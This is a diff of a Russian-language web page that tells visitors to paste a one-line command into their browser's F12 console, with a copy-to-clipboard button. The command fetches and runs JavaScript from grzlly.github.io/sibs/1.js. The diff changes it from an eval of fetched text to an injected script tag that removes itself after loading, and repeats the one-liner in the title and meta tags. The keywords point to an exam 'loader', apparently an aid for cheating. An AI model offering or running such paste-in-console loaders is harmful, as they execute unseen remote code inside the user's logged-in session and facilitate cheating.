@@ -2,8 +2,10 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>eval(await (await fetch('https://grzlly.github.io/sibs/1.js?t=' + Date.now())).text())</title>
-  <meta name="description" content="eval(await (await fetch('https://grzlly.github.io/sibs/1.js?t=' + Date.now())).text())">
+  <title>s=document.createElement('script');s.src='https://grzlly.github.io/sibs/1.js?t='+Date.now();s.onload=()=>s.remove();document.head.append(s)</title>
+  <meta name="description" content="s=document.createElement('script');s.src='https://grzlly.github.io/sibs/1.js?t='+Date.now();s.onload=()=>s.remove();document.head.append(s)">
+  <meta property="og:title" content="s=document.createElement('script');s.src='https://grzlly.github.io/sibs/1.js?t='+Date.now();s.onload=()=>s.remove();document.head.append(s)">
+  <meta property="og:description" content="s=document.createElement('script');s.src='https://grzlly.github.io/sibs/1.js?t='+Date.now();s.onload=()=>s.remove();document.head.append(s)">
   <meta name="keywords" content="grzlly sibs, grzlly sibs loader, grzlly github, sibs exam">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
@@ -17,7 +19,7 @@
 <body>
   <div class="box">
     <div style="font-size:12px;color:#94a3b8;margin-bottom:4px;">Команда для консоли F12:</div>
-    <pre id="code">eval(await (await fetch('https://grzlly.github.io/sibs/1.js?t=' + Date.now(), {cache:'no-store'})).text())</pre>
+    <pre id="code">s=document.createElement('script');s.src='https://grzlly.github.io/sibs/1.js?t='+Date.now();s.onload=()=>s.remove();document.head.append(s)</pre>
     <button id="copyBtn">Скопировать команду в буфер</button>
   </div>
   <script>
